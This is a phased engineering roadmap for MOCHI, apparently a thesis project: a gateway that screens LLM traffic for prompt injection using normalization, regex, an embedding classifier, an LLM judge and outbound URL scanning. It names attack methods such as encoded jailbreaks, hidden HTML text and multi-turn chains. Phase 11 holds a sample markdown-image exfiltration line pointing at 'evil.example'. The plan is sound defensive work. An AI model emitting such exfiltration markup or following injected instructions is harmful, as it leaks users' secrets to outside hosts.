# MOCHI Build Plan

Step-by-step engineering roadmap. Each phase lists a goal, deliverable, key
files, and a "definition of done" so you know when to move on. Phases map
back to the thesis's Table 4 research framework where noted, so progress here
is traceable to your objectives.

**Guiding principle: build a thin vertical slice first (Phase 1), then widen.**
Don't build Stage I fully, then Stage II fully, then wire them together at the
end — get one request flowing end-to-end through the whole pipeline early,
even with stub logic, so you always have something demoable and testable.

---

## Phase 0 — Environment Setup

**Goal:** reproducible dev environment.

- Create venv: `python -m venv .venv`
- `requirements.txt`: `fastapi`, `uvicorn[standard]`, `httpx`, `pydantic`, `python-dotenv`, `pytest`, `pytest-asyncio`
- `.env.example` with `OPENAI_API_KEY=`, `TARGET_LLM_PROVIDER=`, `TARGET_LLM_MODEL=`
- `.gitignore`: `.venv/`, `.env`, `__pycache__/`, `logs/`, `*.pt`, `*.safetensors`
- Repo layout (create empty package dirs with `__init__.py`):
  ```
  mochi/
    gateway/       app.py  models.py  config.py  adapters/
    preprocess/    normalize.py
    detect/        stage1_syntactic.py  stage2_semantic.py  stage3_arbiter.py  pipeline.py
    mitigate/      sanitizer.py
    session/       risk_accumulator.py
    telemetry/     logger.py
    patterns.json
  eval/            run_detection.py  run_mitigation.py  stats.py  datasets.py
  training/        finetune_e5.ipynb
  tests/
  docs/            (already created)
  ```

**Definition of done:** `pytest` runs (even with zero tests) inside the venv without import errors.

---

## Phase 1 — Gateway Skeleton (vertical slice, no detection yet)

**Goal:** a working pass-through proxy: client → MOCHI → real LLM → client.

- `gateway/app.py`: FastAPI app, `POST /v1/chat/completions` endpoint
- `gateway/adapters/openai_adapter.py`: forwards request via `httpx.AsyncClient` to OpenAI, returns response unchanged
- `gateway/config.py`: reads `.env`, exposes `settings` object
- Test manually with `curl` or a Python `openai` client pointed at `base_url="http://localhost:8000/v1"`

**Definition of done:** you can point a real OpenAI client at your local MOCHI instance and get a real completion back, no detection logic involved yet. This proves the plug-and-play integration story works before any security logic exists.

---

## Phase 2 — Telemetry

**Goal:** every request logged, regardless of what happens to it later.

- `telemetry/logger.py`: writes structured JSON per the schema in `ARCHITECTURE.md`
- Wire as FastAPI middleware so it fires on every request without being called explicitly in each route

**Definition of done:** hitting the Phase 1 endpoint produces a JSON line in `logs/mochi.log`.

---

## Phase 3 — Normalization Layer

**Goal:** decode/strip/flag obfuscation before anything else sees the text. Build this *before* Stage I — Stage I is meaningless against obfuscated payloads without it.

- `preprocess/normalize.py`:
  - `normalize_unicode(text)` — NFKC
  - `strip_zero_width(text)` → `(clean_text, found: bool)`
  - `try_decode(text)` — attempt base64/hex/ROT13 decode, return decoded text + flag if successful and decodes to printable text
  - `strip_html(text)` → `(visible_text, hidden_content_flags)` — flag `display:none`, `visibility:hidden`, `font-size:0`, background-matching color, using BeautifulSoup
  - `extract_file_content(file_bytes, mime_type)` → `(text, metadata_dict)` — pdfplumber for PDF body + metadata fields (Author/Title/Subject/Keywords)

**Definition of done:** unit tests proving a base64-wrapped jailbreak string round-trips to plaintext, and a `display:none` div's text is extracted and flagged.

---

## Phase 4 — Source Tagging / Payload Parsing

**Goal:** parse the optional tagged JSON schema; fall back gracefully when untagged.

- `gateway/models.py`: Pydantic models for the tagged payload (`ARCHITECTURE.md` data contract)
- `detect/pipeline.py`: if `context` present, run normalization + detection per-segment with its source tag; if absent, treat the whole message content as a single `user_input`-equivalent segment

**Definition of done:** both a tagged request and a plain OpenAI-style request produce valid pipeline input.

---

## Phase 5 — Evaluation Harness (build early, run continuously)

**Goal:** a way to measure detection quality before you've built all the detection.

- `eval/datasets.py`: loaders for PromptShield, `deepset/prompt-injections`, `jayavibhav/prompt-injection` — normalize each to a common `(text, label, source_dataset)` schema
- `eval/run_detection.py`: run the current pipeline (whatever stages exist) against the loaded set, print confusion matrix + accuracy/precision/recall/F1
- `eval/stats.py`: paired t-test + Cohen's d helper (used later in Phase 11)

**Definition of done:** running `eval/run_detection.py` against Stage I alone (once Phase 6 lands) prints real metrics. Re-run this after every subsequent phase — it's your regression check.

---

## Phase 6 — Stage I: Syntactic Filtering

**Goal:** implement Table 8's detectors plus the three new ones.

- `patterns.json`: all regex patterns, one entry per detector, matching Table 8 categories
- Add three new detector categories: `url_exfiltration`, `obfuscation_encoding`, `invisible_text` (the last consumes normalization flags from Phase 3 rather than re-deriving them)
- `detect/stage1_syntactic.py`: loads patterns, runs against normalized text, returns match + matched detector name
- Unit test per detector category with at least one true positive and one near-miss benign example

**Definition of done:** `eval/run_detection.py` shows Stage I metrics on the combined dataset; false positive rate on benign samples is visible and trackable.

---

## Phase 7 — Session Risk Accumulator

**Goal:** catch multi-turn attack chains that a single-request view can't see.

- `session/risk_accumulator.py`: in-memory `dict[session_id, deque[float]]`, window size configurable (default 5)
- `record_turn(session_id, score) -> cumulative_risk`
- Pipeline integration: after Stage I/II produce a per-turn score, update the accumulator; if `cumulative_risk` crosses a threshold, force escalation to Stage III even if this turn alone scored low
- Unit test: two individually-benign turns whose combined score should trigger escalation

**Definition of done:** a scripted two-turn sequence (benign setup + exploit) escalates to Stage III on turn 2, and a test proving single unrelated benign turns from different sessions don't cross-contaminate.

---

## Phase 8 — Stage II: Semantic Detection

**Goal:** fine-tuned embedding classifier for the cases Stage I regex misses.

- `training/finetune_e5.ipynb` (run on Colab/GPU): fine-tune `multilingual-e5-small` on the combined labeled dataset per the thesis's training config (binary cross-entropy, Adam, lr 2e-5, batch 32, 3 epochs) — adjust batch size to what the free-tier GPU allows
- Export weights to `models/e5-fine-tuned/`
- `detect/stage2_semantic.py`: loads model, scores normalized text, applies 0.45/0.55 thresholds
- Re-run Phase 5 harness with Stage I + II combined

**Definition of done:** F1 improves over Stage I alone on the eval set; latency measured and compared against the NFR1 target (flag if `-large` is too slow, switch to `-small`).

---

## Phase 9 — Stage III: Cognitive Arbitration

**Goal:** LLM-judge for the uncertain band, with enriched context.

- `detect/stage3_arbiter.py`: OpenAI call using the system prompt from Figure 6, extended to include source tag, active normalization flags, and current session cumulative risk
- Config-driven model string (already planned in Figure 8) — confirms the model-independence story from `ARCHITECTURE.md`
- Only invoked when Stage II lands in the 0.45–0.55 band or session risk forces escalation

**Definition of done:** escalation rate on the eval set is measured and reported (what % of traffic actually reaches Stage III) — this number is what you'll need when a panelist asks about Stage III's latency budget.

---

## Phase 10 — Decision Enforcement + Sanitization

**Goal:** turn detection into action.

- `mitigate/sanitizer.py`: given flagged spans, redact them and return the remaining prompt intact
- `detect/pipeline.py`: full ALLOW / BLOCK / SANITIZE logic per Figure 7's hybrid decision rule, now including session risk as an input

**Definition of done:** a request with one malicious sentence embedded in an otherwise-benign prompt gets sanitized (not fully blocked) and the sanitized version still reaches the target LLM.

---

## Phase 11 — Outbound Interception

**Goal:** catch what leaks through, and catch exfiltration attempts in the response.

- Extend outbound scan: re-run Stage I/II-style detection on the target LLM's *response* text to catch injected instructions that altered output
- `mitigate/url_scanner.py`: extract all URLs from the response; flag non-allowlisted domains and high-entropy query strings (markdown image/link exfiltration pattern)

**Definition of done:** a crafted response containing `![x](https://evil.example/log?d=<secret>)` is flagged before returning to the client.

---

## Phase 12 — Target LLM Adapter Layer

**Goal:** operationalize the model-independence argument — swapping backends is a config change.

- `gateway/adapters/base.py`: abstract interface (canonical request/response shape)
- `gateway/adapters/openai_adapter.py`, `anthropic_adapter.py`, `gemini_adapter.py`: thin per-provider translators
- `gateway/config.py`: `TARGET_LLM_PROVIDER` selects adapter at startup

**Definition of done:** the same MOCHI instance, same detection code, serves requests to at least two different backend providers by changing only `.env`.

---

## Phase 13 — Full Evaluation (maps to thesis Phase 2–4)

- **Detection effectiveness** (thesis Phase 2): 5-fold CV, accuracy/precision/recall/F1, baseline vs Stage I vs Stage I+II vs full MOCHI
- **Mitigation effectiveness** (thesis Phase 3): ASR, Mitigation Rate, attack simulation protocol across the attack types in Table 16
- **Multi-LLM comparative evaluation** (thesis Phase 4, Table 19): run the full attack corpus against each configured backend adapter
- **Out-of-distribution generalization test** (new, recommended addition): hold out a model never referenced during Stage II training/dev and confirm detection still works — this is the strongest available rebuttal to the "moving target LLM" objection
- **Statistical significance**: paired t-test + Cohen's d via `eval/stats.py`, before/after comparison per H01–H06

**Definition of done:** all Chapter III tables (10, 11, 12, 17, 18, 19) have real numbers instead of placeholders.

---

## Phase 14 — Packaging

- `Dockerfile` + `docker-compose.yml` (gateway + optional Redis for session store if you outgrow in-memory)
- `README.md` — quick-start matching Appendix J's User's Manual
- Confirm `.env.example` covers every required variable

**Definition of done:** `docker compose up` gets a fresh clone running without manual steps beyond copying `.env.example` to `.env` and filling in an API key.

---

## Suggested Order of Attack

Phases 0–2 first (get something running and observable), then 5 in parallel
with 3/6 (build eval harness alongside Stage I so you can measure as you go),
then 4, 7, 8, 9, 10, 11, 12 roughly in that order, then 13 for the thesis
numbers, then 14 last.
